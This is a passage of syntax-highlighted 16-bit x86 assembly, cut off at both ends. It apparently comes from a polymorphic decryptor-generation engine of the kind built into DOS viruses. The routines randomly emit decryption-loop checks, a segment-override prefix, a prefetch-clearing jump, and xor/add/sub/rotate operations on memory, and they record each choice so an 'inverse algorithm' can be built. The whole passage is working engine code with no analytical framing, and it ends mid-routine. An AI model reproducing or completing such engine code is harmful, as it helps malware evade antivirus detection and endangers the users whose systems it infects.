        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_begin_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;    ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">


</span><span class="sc5">exitloop_condition_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dumb_cntr_ass</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; inc opcode</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">clear_prefetch_if_dn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; jmp to next instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">     </span><span class="sc1">; dec opcode</span><span class="sc0">

</span><span class="sc5">clear_prefetch_if_dn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tipo_register</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; how did we initialize?</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; do the check to match init</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">table_end_loop_check</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the code for the three routines from the table_end_loop_check table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">endloop_check_counter_upwards</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; inc opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; generate check for end of loop</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">    </span><span class="sc1">; cmp counter,imm</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">cmp_wzero</span><span class="sc0"> </span><span class="sc1">; with imm = 00</span><span class="sc0">

</span><span class="sc5">endloop_check_counter_down_wl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; is cx?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">is_cx_so_can_loop</span><span class="sc0">

</span><span class="sc5">endloop_check_counter_down</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">     </span><span class="sc1">; dec counter</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">put_thefin_jne</span><span class="sc0">

</span><span class="sc5">is_cx_so_can_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">    </span><span class="sc1">; loop opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">add_loop_offset</span><span class="sc0">

</span><span class="sc5">endloop_check_just_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; cmp pointer,imm</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">cmp_wzero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_check_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">  </span><span class="sc1">; save if has to be</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; changed later</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">put_thefin_jne</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">     </span><span class="sc1">; jne opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">add_loop_offset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; calculate the jump offset</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_begin_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dec_loop_end_pos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">check_for_segovv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">need_segovv</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; need to force CS: ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_segovv_ndd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">     </span><span class="sc1">; CS: segment override</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_segovv_ndd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">generate_math_on_mem_ops</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">math_seq_stack_off</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">howmany_from_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; to our current stack</span><span class="sc0">
                            </span><span class="sc1">; reserved space</span><span class="sc0">
</span><span class="sc5">mom_loop_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_for_segovv</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get the value from</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; stack and create</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_used_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; call table entry</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">mom_loop_next</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">mom_loop_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">mom_loop_gen</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">correct_regpair_in_al</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">create_or_just_read</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; if = 0 then we are creating the memory modificating code, so this routine</span><span class="sc0">
</span><span class="sc1">;    must generate the [pnt],reg pair for the instruction and put it in al</span><span class="sc0">
</span><span class="sc1">; if = 1 then we are just creating the inverse algorithm, so the routine will</span><span class="sc0">
</span><span class="sc1">;    just read the corrispondent register pair from the stack structure</span><span class="sc0">
</span><span class="sc1">;    and pass it back in al.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">just_reading_already_existing</span><span class="sc0">

</span><span class="sc5">chk_reselect_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">        </span><span class="sc1">; get a random reg</span><span class="sc0">
                            </span><span class="sc1">; to operate with</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">proceed_next_check</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">chk_reselect_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">chk_reselect_reg</span><span class="sc0">
</span><span class="sc5">proceed_next_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">chk_not_di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">chk_not_di</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">chk_not_si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">chk_not_si</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">chk_not_bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">chk_not_bp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">chk_not_bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">chk_not_bx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_direction</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">math_seq_stack_off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to correct entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; to stack zone</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; save on stack for l8r</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">math_seq_stack_off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; on next one</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">just_reading_already_existing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">layer_sp_pointer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; to stack zone</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">math_seq_stack_off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to correct entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get it off stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">math_seq_stack_off</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; on next</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; routines that create math operations on memory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mom_routines_xor_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">     </span><span class="sc1">; xor [reg],reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_add_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; add [reg],reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_sub_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">     </span><span class="sc1">; sub [reg],reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_ror_1_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">    </span><span class="sc1">; ror [reg],1</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_ror_cl_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">    </span><span class="sc1">; ror [reg],cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_rol_1_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">    </span><span class="sc1">; rol [reg],1</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">correct_regpair_in_al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mom_routines_rol_cl_mem</span><span class="sc4">:</span><span class="sc0">
